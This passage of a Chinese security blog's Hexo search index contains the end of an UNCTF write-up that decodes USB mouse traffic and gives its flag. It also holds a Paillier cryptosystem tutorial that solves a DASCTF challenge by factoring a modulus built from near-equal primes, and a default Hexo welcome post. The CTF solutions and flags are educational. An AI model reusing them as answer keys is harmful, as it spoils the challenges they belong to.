number">127</span> <span class="token punctuation">:</span>        y <span class="token operator">-=</span> <span class="token number">256</span>    posx <span class="token operator">+=</span> x    posy <span class="token operator">+=</span> y    btn_flag <span class="token operator">=</span> int<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1 for left , 2 for right , 0 for nothing</span>    <span class="token keyword">if</span> btn_flag <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 1 代表左键</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>posx<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token operator">-</span>posy<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>转换好之后用gnuplot绘图</p><p><img src="/images/%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E6%99%B4%E9%9B%A8%E5%88%9D%E9%9B%AA-UNCTF-WP/image-20221117170926142.png"></p><p>然后把鼠标流量和键盘流量结合起来就得到flag</p><p>UNCTF{TOM_AND_JERRY_BEST_FRIENDS}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/11/06/paillier%20cryptosystem/"/>
      <url>/2022/11/06/paillier%20cryptosystem/</url>
      
        <content type="html"><![CDATA[<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><p>  现代公钥密码系统中，远远不止RSA、DSA、ECC等广为人知的公钥密码系统，最近还学习到了一种比较新的公钥密码系统 —— <strong>paillier cryptosystem</strong> 。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>  Paillier密码，于1999年由Pascal Paillier发明，是一种用于公钥加密的概率非对称算法。该算法具有加法同态的性质。</p><h3 id="1：什么是同态加密？"><a href="#1：什么是同态加密？" class="headerlink" title="1：什么是同态加密？"></a>1：什么是同态加密？</h3><p><strong>同态加密（Homomorphic Encryption, HE）</strong> 是指满足密文同态运算性质的加密算法，即数据经过同态加密之后，对密文进行特定的计算，得到的密文计算结果在进行对应的同态解密后的明文等同于对明文数据直接进行相同的计算，实现数据的“可算不可见”。同态加密的实现效果如图所示。</p><p><img src="/../images/paillier%20cryptosystem/image-20221106183020259.png"></p><p>同态加密通常为非对称性加密。因此在介绍同态加密之前，简单介绍一下非对称性加密。非对称性加密分为三个步骤：</p><ol><li><p>生成一对钥匙，一个公钥pub和一个密钥priv；</p></li><li><p>使用公钥pub加密原始数据，得到加密数据，公式：pub(原始数据）&#x3D; 加密数据 ；</p></li><li><p>使用密钥priv解密加密数据，得到原始数据，公式：priv(加密数据）&#x3D; 原始数据 。</p></li></ol><p>同态加密允许对加密数据进行处理，得到的解密结果等价于在原始数据下做运算。以下面即将学习用到的Paillier算法举例，假设我有两个数m1和m2，我希望把它们扔给第三方做加法运算，即m1+m2。同时不希望第三方知道m1、m2及它们之和的具体值，同态加密可以派上用场，具体步骤如下：</p><p><img src="/../images/paillier%20cryptosystem/image-20221121161443773.png"></p><h3 id="2：同态加密算法原理"><a href="#2：同态加密算法原理" class="headerlink" title="2：同态加密算法原理"></a>2：同态加密算法原理</h3><p>如果一种同态加密算法支持对密文进行任意形式的计算，则称其为全同态加密（Fully Homomorphic Encryption,  FHE）；如果支持对密文进行部分形式的计算，例如仅支持加法、仅支持乘法或支持有限次加法和乘法，则称其为半同态加密或部分同态加密，英文简称为SWHE（Somewhat Homomorphic Encryption）或PHE（Partially Homomorphic  Encryption）。一般而言，由于任意计算均可通过加法和乘法构造，若加密算法同时满足加法同态性和乘法同态性，则可称其满足全同态性。</p><h3 id="3：主流同态加密算法原理"><a href="#3：主流同态加密算法原理" class="headerlink" title="3：主流同态加密算法原理"></a>3：主流同态加密算法原理</h3><p>（1）乘法同态加密算法</p><p>在实际应用中，密文乘法同态性的需求场景不多，因此乘法同态性通常偶然存在于已有的经典加密算法中。满足乘法同态特性的典型加密算法包括1977年提出的RSA公钥加密算法和1985年提出的ElGamal公钥加密算法等。<br> ① RSA算法<br>  RSA算法是最为经典的公钥加密算法，至今已有40余年的历史，其安全性基于大整数分解困难问题。在实际应用中，RSA算法可采用RSA_PKCS1_PADDING、RSA_PKCS1_OAEP_PADDING等填充模式，根据密钥长度（常用1024位或2048位）对明文分组进行填充，而只有不对明文进行填充的原始RSA算法才能满足乘法同态特性。由于原始的RSA不是随机化加密算法，即加密过程中没有使用随机因子，每次用相同密钥加密相同明文的结果是固定的。因此，利用RSA的乘法同态性实现同态加密运算会存在安全弱点，攻击者可能通过选择明文攻击得到原始数据。<br> ② ElGamal算法</p><p>ElGamal算法是一种基于Diffie-Hellman离散对数困难问题的公钥密码算法，可实现公钥加密和数字签名功能，同时满足乘法同态特性。ElGamal是一种随机化加密算法，即使每次用相同密钥加密相同明文得到的密文结果也不相同，因此不存在与RSA算法类似的选择明文攻击问题，是ISO同态加密国际标准中唯一指定的乘法同态加密算法。</p><p>（2）加法同态加密算法</p><p>Paillier算法是1999年提出的一种基于合数剩余类问题的公钥加密算法，</p><p><img src="/../images/paillier%20cryptosystem/image-20221106190503920.png"></p><p>也是目前最为常用且最具实用性的加法同态加密算法，已在众多具有同态加密需求的应用场景中实现了落地应用，同时也是ISO同态加密国际标准中唯一指定的加法同态加密算法。此外，由于支持加法同态，所以Paillier算法还可支持数乘同态，即支持密文与明文相乘。</p><p>（3）全同态加密算法</p><p>Gentry算法是2009年IBM的Craig Gentry首次提出的一种基于理想格的全同态算法。(第一代全同态加密)，还有第二代、第三代全同态加密。</p><h2 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h2><h3 id="第一种模式："><a href="#第一种模式：" class="headerlink" title="第一种模式："></a>第一种模式：</h3><pre class=" language-html"><code class="language-html">随机选择两个大质数p、q满足gcd(pq,(p−1)⋅(q−1))=1。计算n=p⋅q，λ=lcm(p−1,q−1)=(p−1)⋅(q−1)/gcd(p−1,q−1)选择随机整数g，0&lt;g&lt;n^2定义L(x)=(x−1)/n计算μ=(L(g^λ(mod n^2)))^−1(mod n)公钥为(n，g)私钥为(λ，μ)</code></pre><h3 id="第二种模式（比较简单）："><a href="#第二种模式（比较简单）：" class="headerlink" title="第二种模式（比较简单）："></a>第二种模式（比较简单）：</h3><p>其余参数不变，主要改变了g，λ，μ的定义</p><ol><li><p>g&#x3D;n+1</p></li><li><p>λ&#x3D;φ(n)&#x3D;(p−1)⋅(q−1)</p></li><li><p>μ&#x3D;φ(n)^−1(mod n)</p></li></ol><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><ol><li><p>设m为要加密的消息，显然需要满足，0≤m＜n</p></li><li><p>选择随机 r，保证gcd( r,n )&#x3D;1</p></li><li><p>密文c：c&#x3D;g^m⋅r^n( mod n^2 )</p></li></ol><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>m&#x3D;( L ( c^λ ( mod n^2))⋅ μ ) mod n</p><h2 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h2><p>以下推理过程就用数学公式记录了，如果平台显示不出来的话，建议复制进typora等此类编辑器中食用，下面也会给出截图</p><h3 id="第一种模式"><a href="#第一种模式" class="headerlink" title="第一种模式"></a>第一种模式</h3><p><img src="/../images/paillier%20cryptosystem/image-20221106192821957.png"></p><p>因为</p><p><img src="/../images/paillier%20cryptosystem/image-20221106195244976.png"></p><p>所以</p><p><img src="/../images/paillier%20cryptosystem/image-20221106195257375.png" alt="image-20221106195257375"></p><p>即</p><p><img src="/../images/paillier%20cryptosystem/image-20221106195356794.png"></p><h3 id="第二种模式"><a href="#第二种模式" class="headerlink" title="第二种模式"></a>第二种模式</h3><p><img src="/../images/paillier%20cryptosystem/image-20221106192849064.png"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="DASCTF四月月赛-not-RSA"><a href="#DASCTF四月月赛-not-RSA" class="headerlink" title="DASCTF四月月赛 not RSA"></a>DASCTF四月月赛 not RSA</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime <span class="token keyword">as</span> bytes_to_long<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token keyword">from</span> sympy <span class="token keyword">import</span> isprime<span class="token punctuation">,</span>nextprime<span class="token keyword">import</span> randomm<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qg<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>r<span class="token operator">=</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token punctuation">(</span>pow<span class="token punctuation">(</span>g<span class="token punctuation">,</span>m<span class="token punctuation">,</span>n<span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token operator">*</span>pow<span class="token punctuation">(</span>r<span class="token punctuation">,</span>n<span class="token punctuation">,</span>n<span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">(</span>n<span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"c=%d"</span><span class="token operator">%</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"n=%d"</span><span class="token operator">%</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span></code></pre><p>可以看到，这一题就是用的paillier cryptosystem，并且参数用的是上文中的第二种简单的模式</p><p>但是我们计算λ&#x3D;φ(n)&#x3D;(p−1)⋅(q−1) ，需要用到p和q</p><p>这里我们直接用yafu尝试分解n发现可以成功分解，原理是p与q其实非常接近，所以其实直接对n开根然后再在附近寻找素数就能找到p、q了。</p><p><img src="/../images/paillier%20cryptosystem/image-20221106200653988.png"></p><p>所以构造解密脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token punctuation">,</span>inverse<span class="token keyword">from</span> sympy <span class="token keyword">import</span> nextprime<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> iroot<span class="token keyword">def</span> <span class="token function">L</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>x<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">/</span>nc<span class="token operator">=</span><span class="token number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span>n<span class="token operator">=</span><span class="token number">6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span>p<span class="token operator">=</span><span class="token number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span>q<span class="token operator">=</span><span class="token number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span><span class="token comment" spellcheck="true">#根据解密公式，计算所需私钥对（λ，μ）</span>Lambda<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>miu<span class="token operator">=</span>inverse<span class="token punctuation">(</span>Lambda<span class="token punctuation">,</span>n<span class="token operator">*</span>n<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token punctuation">(</span>L<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>Lambda<span class="token punctuation">,</span>n<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">*</span>miu<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token keyword">print</span> <span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/09/26/hello-world/"/>
      <url>/2022/09/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
